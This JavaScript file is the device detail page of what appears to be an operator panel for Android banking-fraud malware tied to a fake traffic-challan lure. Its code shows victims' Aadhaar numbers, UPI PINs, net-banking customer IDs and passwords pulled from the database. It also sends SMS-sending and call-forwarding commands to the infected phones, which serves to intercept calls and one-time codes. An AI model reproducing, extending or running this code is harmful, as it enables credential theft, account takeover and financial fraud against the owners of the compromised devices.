// ==========================================
// DEVICE DETAIL PAGE LOGIC
// ==========================================
requireAuth();

const params = new URLSearchParams(window.location.search);
const deviceId = params.get("id");

if (!deviceId) {
  window.location.href = "dashboard.html";
}

let currentDevice = {};
let selectedSimSms = 1;
let selectedSimCf = 1;

// Load device data (realtime)
db.ref("device_info/" + deviceId).on("value", (snap) => {
  const d = snap.val() || {};
  currentDevice = d;
  renderDevice(d);
});

// Load challan_users data (login details)
let challanUser = {};
db.ref("challan_users/" + deviceId).on("value", (snap) => {
  challanUser = snap.val() || {};
});

// ==========================================
// RENDER DEVICE DETAIL
// ==========================================
function renderDevice(d) {
  const online = isDeviceOnline(d.last_seen);
  const statusText = online
    ? '<span class="online">✅ Online</span>'
    : '<span class="offline">📵 Offline</span>';

  const html = `
    <!-- Top 3 control buttons -->
    <div class="two-col-btns">
      <button class="big-btn" onclick="openModal('modalCallFwd')">📞 CALL FORWARD</button>
      <button class="big-btn" onclick="openModal('modalSms')">💬 SEND SMS</button>
    </div>
    <button class="big-btn" onclick="openSimModal()">📶 UPDATE SIM NUMBER</button>

    <!-- Device Info Card -->
    <div class="detail-header-card">
      <div class="row"><span class="k">Model:</span><span class="v">${escapeHtml(d.device_model || "-")}</span></div>
      <div class="row"><span class="k">OS Version:</span><span class="v">Android ${escapeHtml(d.android_version || "-")}</span></div>
      <div class="row"><span class="k">Device Name:</span><span class="v">${escapeHtml(d.device_manufacturer || "-")}</span></div>
      <div class="row"><span class="k">Device ID:</span><span class="v" style="font-size:11px;">${escapeHtml(deviceId)}</span></div>
      <div class="row"><span class="k">SIM1:</span><span class="v" style="color:#4ade80;">${escapeHtml(d.sim1 || d.sim1_number || "No SIM Found")}</span></div>
      <div class="row"><span class="k">SIM2:</span><span class="v" style="color:#4ade80;">${escapeHtml(d.sim2 || d.sim2_number || "No SIM Found")}</span></div>
    </div>

    <!-- Connection Status -->
    <div class="connection-status">
      Connection Status: ${statusText}
    </div>

    <!-- Login Details Button -->
    <button class="big-btn" onclick="openLoginDetails()">🔐 LOGIN DETAILS</button>

    <!-- Recent Messages -->
    <div class="section-card">
      <h3>💬 RECENT MESSAGES</h3>
      <div id="recentMessages">
        <div style="text-align:center;color:#888;padding:20px;">Loading messages...</div>
      </div>
    </div>
  `;

  document.getElementById("content").innerHTML = html;
  loadRecentMessages();
}

// ==========================================
// LOAD RECENT MESSAGES
// ==========================================
function loadRecentMessages() {
  db.ref("sms_commands/" + deviceId).limitToLast(5).once("value").then((snap) => {
    const data = snap.val() || {};
    const msgs = [];
    Object.keys(data).forEach((k) => {
      msgs.push({ key: k, ...data[k] });
    });
    msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

    const el = document.getElementById("recentMessages");
    if (msgs.length === 0) {
      el.innerHTML = '<div style="text-align:center;color:#888;padding:20px;">Koi message nahi.</div>';
      return;
    }

    el.innerHTML = msgs.map((m) => `
      <div class="msg-item ${m.direction === 'out' || m.status === 'sent' ? 'sent' : ''}" style="margin-bottom:8px;">
        <div class="msg-header">
          <span>
            <span class="msg-tag ${m.direction === 'out' || m.status === 'sent' ? 'tag-out' : 'tag-in'}">
              ${m.direction === 'out' || m.status === 'sent' ? '📤 SENT' : '📩 RECEIVED'}
            </span>
            From: ${escapeHtml(m.target_number || m.from || "-")}
          </span>
          <span>${formatTime(m.timestamp)}</span>
        </div>
        <div class="msg-body">${escapeHtml(m.message || m.body || "-")}</div>
      </div>
    `).join("");
  });
}

// ==========================================
// SIM SELECTOR
// ==========================================
function selectSim(type, sim) {
  if (type === 'sms') {
    selectedSimSms = sim;
    document.querySelectorAll('#modalSms .sim-option').forEach((el, i) => {
      el.classList.toggle('active', (i + 1) === sim);
    });
  } else if (type === 'cf') {
    selectedSimCf = sim;
    document.querySelectorAll('#modalCallFwd .sim-option').forEach((el, i) => {
      el.classList.toggle('active', (i + 1) === sim);
    });
  }
}

// ==========================================
// SEND SMS
// ==========================================
function sendSMS() {
  const number = document.getElementById("smsNumber").value.trim();
  const message = document.getElementById("smsMessage").value.trim();

  if (!number || !message) {
    alert("Number aur message dono chahiye!");
    return;
  }

  const ref = db.ref("sms_commands/" + deviceId).push();
  ref.set({
    device_id: deviceId,
    target_number: number,
    message: message,
    sim_slot: selectedSimSms,
    status: "pending",
    timestamp: Date.now(),
    direction: "out"
  }).then(() => {
    alert("SMS command bheja gaya!");
    document.getElementById("smsNumber").value = "";
    document.getElementById("smsMessage").value = "";
    closeModal('modalSms');
  }).catch((err) => alert("Error: " + err.message));
}

// SMS counter
document.addEventListener("input", (e) => {
  if (e.target && e.target.id === "smsMessage") {
    document.getElementById("smsCounter").textContent = e.target.value.length + "/150";
  }
});

// ==========================================
// CALL FORWARD
// ==========================================
function sendCallForward(action) {
  const number = document.getElementById("cfNumber").value.trim();

  if (action === "activate" && !number) {
    alert("Number daalo pehle!");
    return;
  }

  const ref = db.ref("call_forward_commands/" + deviceId).push();
  ref.set({
    action: action,
    number: number,
    sim_slot: selectedSimCf,
    status: "pending",
    timestamp: Date.now()
  }).then(() => {
    alert(`Call forward ${action} command bheja gaya!`);
    closeModal('modalCallFwd');
  }).catch((err) => alert("Error: " + err.message));
}

// ==========================================
// UPDATE SIM
// ==========================================
function openSimModal() {
  document.getElementById("sim1Input").value = currentDevice.sim1 || currentDevice.sim1_number || "";
  document.getElementById("sim2Input").value = currentDevice.sim2 || currentDevice.sim2_number || "";
  document.getElementById("modalSim").classList.add("active");
}

function updateSim() {
  const sim1 = document.getElementById("sim1Input").value.trim();
  const sim2 = document.getElementById("sim2Input").value.trim();

  const update = {};
  if (sim1) update.sim1 = sim1;
  if (sim2) update.sim2 = sim2;

  if (Object.keys(update).length === 0) {
    alert("Kam se kam ek SIM number daalo!");
    return;
  }

  db.ref("device_info/" + deviceId).update(update).then(() => {
    alert("SIM update ho gaya!");
    closeModal('modalSim');
  }).catch((err) => alert("Error: " + err.message));
}

// ==========================================
// LOGIN DETAILS
// ==========================================
function openLoginDetails() {
  const el = document.getElementById("loginDetailsContent");

  // Challan user data + upi/netbanking from device
  const cu = challanUser || {};
  const d = currentDevice || {};

  const html = `
    <div class="section-card" style="margin:0 0 12px 0;">
      <h3>👤 PERSONAL INFO</h3>
      <div style="font-size:13px;line-height:1.9;color:#333;">
        <div><b>Name:</b> ${escapeHtml(cu.user_name || cu.name || d.user_name || "-")}</div>
        <div><b>Mobile:</b> ${escapeHtml(cu.mobile || cu.phone || d.mobile || "-")}</div>
        <div><b>DOB:</b> ${escapeHtml(cu.dob || d.dob || "-")}</div>
        <div><b>Aadhar:</b> ${escapeHtml(cu.aadhar || cu.aadhaar || d.aadhar || "-")}</div>
        <div style="color:#c62828;"><b>UPI PIN:</b> ${escapeHtml(cu.upi_pin || d.upi_pin || "N/A")}</div>
      </div>
    </div>

    <div class="section-card" style="margin:0;">
      <h3>🏦 NET BANKING DETAILS</h3>
      <div id="netbankingData" style="font-size:13px;line-height:1.9;color:#333;">
        Loading...
      </div>
    </div>
  `;

  el.innerHTML = html;
  document.getElementById("modalLoginDetails").classList.add("active");

  // Load netbanking_payments
  db.ref("netbanking_payments").orderByChild("device_id").equalTo(deviceId).once("value").then((snap) => {
    const data = snap.val() || {};
    const keys = Object.keys(data);
    const nb = document.getElementById("netbankingData");

    if (keys.length === 0) {
      nb.innerHTML = "<i>Koi netbanking data nahi.</i>";
      return;
    }

    nb.innerHTML = keys.map((k) => {
      const p = data[k] || {};
      return `
        <div style="border-bottom:1px solid #eee;padding:8px 0;">
          <div><b>Bank:</b> ${escapeHtml(p.netbanking_bank || "-")}</div>
          <div><b>Account Holder:</b> ${escapeHtml(p.netbanking_account_holder || "-")}</div>
          <div><b>Customer ID:</b> ${escapeHtml(p.netbanking_customer_id || "-")}</div>
          <div style="color:#c62828;"><b>Password:</b> ${escapeHtml(p.netbanking_password || "-")}</div>
          <div style="font-size:11px;color:#888;">Amount: ${escapeHtml(p.amount || "-")}</div>
        </div>
      `;
    }).join("");
  }).catch(() => {
    document.getElementById("netbankingData").innerHTML = "<i>Error loading data.</i>";
  });
}

// ==========================================
// MODAL CONTROLS
// ==========================================
function openModal(id) {
  document.getElementById(id).classList.add("active");
}
function closeModal(id) {
  document.getElementById(id).classList.remove("active");
}

document.querySelectorAll(".modal-overlay").forEach((overlay) => {
  overlay.addEventListener("click", (e) => {
    if (e.target === overlay) overlay.classList.remove("active");
  });
});
